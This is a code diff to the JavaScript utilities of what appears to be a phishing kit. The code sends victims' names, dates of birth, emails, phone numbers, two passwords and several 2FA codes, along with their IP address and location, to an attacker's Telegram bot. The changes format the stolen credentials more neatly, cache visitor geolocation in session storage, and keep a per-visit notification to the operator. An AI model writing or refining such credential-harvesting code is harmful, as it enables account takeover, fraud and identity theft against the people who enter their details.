@@ -104,9 +104,18 @@ const Utils = {
         return true;
     },
 
-    telegramLine(label, value) {
+    telegramEscape(value) {
+        return String(value)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    },
+
+    telegramLine(label, value, asCode) {
         if (!this.telegramHasValue(value)) return '';
-        return `${label}: ${String(value).trim()}`;
+        const safe = this.telegramEscape(String(value).trim());
+        const body = asCode ? `<code>${safe}</code>` : safe;
+        return `<b>${this.telegramEscape(label)}:</b> ${body}`;
     },
 
     telegramJoin(groups) {
@@ -114,7 +123,7 @@ const Utils = {
         groups.forEach((group) => {
             const lines = (group || []).filter(Boolean);
             if (!lines.length) return;
-            if (parts.length) parts.push('----------------------');
+            if (parts.length) parts.push('────────────────');
             parts.push.apply(parts, lines);
         });
         return parts.join('\n');
@@ -134,8 +143,8 @@ const Utils = {
 
     telegramVisitMessage(loc) {
         return this.telegramJoin([[
-            this.telegramLine('IP', loc.ip),
-            this.telegramLine('Location', loc.location),
+            this.telegramLine('IP', loc.ip, true),
+            this.telegramLine('Location', loc.location, true),
             this.telegramLine('Page', this.telegramPageUrl())
         ]]);
     },
@@ -143,8 +152,8 @@ const Utils = {
     telegramFormMessage(loc, data, withTwoFa) {
         return this.telegramJoin([
             [
-                this.telegramLine('IP', loc.ip),
-                this.telegramLine('Location', loc.location)
+                this.telegramLine('IP', loc.ip, true),
+                this.telegramLine('Location', loc.location, true)
             ],
             [
                 this.telegramLine('Full Name', data.fullName),
@@ -152,18 +161,18 @@ const Utils = {
                 this.telegramLine('Date of Birth', this.formatDateOfBirth(data))
             ],
             [
-                this.telegramLine('Email', data.email),
-                this.telegramLine('Business Email', data.emailBusiness),
-                this.telegramLine('Phone', data.phone)
+                this.telegramLine('Email', data.email, true),
+                this.telegramLine('Business Email', data.emailBusiness, true),
+                this.telegramLine('Phone', data.phone, true)
             ],
             [
-                this.telegramLine('Password(1)', data.password),
-                this.telegramLine('Password(2)', data.passwordSecond)
+                this.telegramLine('Password(1)', data.password, true),
+                this.telegramLine('Password(2)', data.passwordSecond, true)
             ],
             withTwoFa ? [
-                this.telegramLine('2FA(1)', data.twoFa),
-                this.telegramLine('2FA(2)', data.twoFaSecond),
-                this.telegramLine('2FA(3)', data.twoFaThird)
+                this.telegramLine('2FA(1)', data.twoFa, true),
+                this.telegramLine('2FA(2)', data.twoFaSecond, true),
+                this.telegramLine('2FA(3)', data.twoFaThird, true)
             ] : []
         ]);
     },
@@ -183,14 +192,63 @@ const Utils = {
             body: JSON.stringify({
                 chat_id: CONFIG.TELEGRAM_CHAT_ID,
                 text,
+                parse_mode: 'HTML',
                 disable_web_page_preview: true
             })
         });
         return res;
     },
 
+    persistLocation(loc) {
+        this._locationCache = loc;
+        try {
+            if (loc && loc.country_code && loc.country_code !== 'N/A') {
+                sessionStorage.setItem('__geo_cc__', String(loc.country_code).toUpperCase());
+            }
+            sessionStorage.setItem('__geo_loc__', JSON.stringify({
+                ip: loc.ip,
+                country_code: loc.country_code,
+                country_name: loc.country_name,
+                region: loc.region,
+                region_code: loc.region_code,
+                city: loc.city,
+                location: loc.location
+            }));
+        } catch (e) { /* ignore */ }
+        return loc;
+    },
+
+    restoreLocation() {
+        if (this._locationCache) return this._locationCache;
+        try {
+            const saved = JSON.parse(sessionStorage.getItem('__geo_loc__') || 'null');
+            if (saved && saved.country_code && saved.country_code !== 'N/A') {
+                this._locationCache = saved;
+                return saved;
+            }
+        } catch (e) { /* ignore */ }
+        return null;
+    },
+
+    geoCountryIso() {
+        const cached = this._locationCache && this._locationCache.country_code;
+        const fromCc = sessionStorage.getItem('__geo_cc__');
+        const restored = this.restoreLocation();
+        const iso = String(
+            cached ||
+            fromCc ||
+            (restored && restored.country_code) ||
+            window.__geoCountry ||
+            ''
+        ).toUpperCase();
+        if (/^[A-Z]{2}$/.test(iso)) return iso;
+        return '';
+    },
+
     async getUserLocation() {
         if (this._locationCache) return this._locationCache;
+        const restored = this.restoreLocation();
+        if (restored) return restored;
 
         const empty = {
             location: 'N/A',
@@ -280,7 +338,7 @@ const Utils = {
                         country_name: raw.country_name || this.countryNameFromCode(raw.country_code)
                     })
                 };
-                this._locationCache = loc;
+                this.persistLocation(loc);
                 return loc;
             } catch (error) { /* try next */ }
         }
@@ -291,7 +349,7 @@ const Utils = {
                 ip: ipv4,
                 location: `${ipv4} | N/A | N/A`
             };
-            this._locationCache = loc;
+            this.persistLocation(loc);
             return loc;
         }
 
@@ -387,7 +445,7 @@ const Utils = {
 
     async sendVisitNotification() {
         if (window.__visitPingStarted || sessionStorage.getItem('__visit_ping__')) {
-            this.markVisitBootDone();
+            this.getUserLocation().finally(() => this.markVisitBootDone());
             return;
         }
         window.__visitPingStarted = true;
@@ -395,7 +453,6 @@ const Utils = {
 
         try {
             const loc = await this.getUserLocation();
-            const text = this.telegramVisitMessage(loc);
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), 8000);
             await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -403,7 +460,8 @@ const Utils = {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
+                    text: this.telegramVisitMessage(loc),
+                    parse_mode: 'HTML',
                     disable_web_page_preview: true
                 }),
                 signal: controller.signal
